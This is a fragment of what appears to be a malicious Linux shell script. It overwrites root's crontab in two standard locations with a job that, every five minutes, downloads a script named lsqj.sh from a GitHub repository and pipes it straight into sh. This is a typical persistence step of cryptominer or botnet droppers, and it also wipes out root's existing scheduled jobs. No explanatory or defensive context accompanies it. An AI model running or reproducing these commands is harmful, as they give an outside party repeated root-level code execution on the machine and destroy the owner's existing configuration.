...
echo "*/5 * * * * curl -fsSL https://github.com/idg7494/idg7494/raw/master/lsqj.sh | sh" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/5 * * * * curl -fsSL https://github.com/idg7494/idg7494/raw/master/lsqj.sh | sh" > /var/spool/cron/crontabs/root
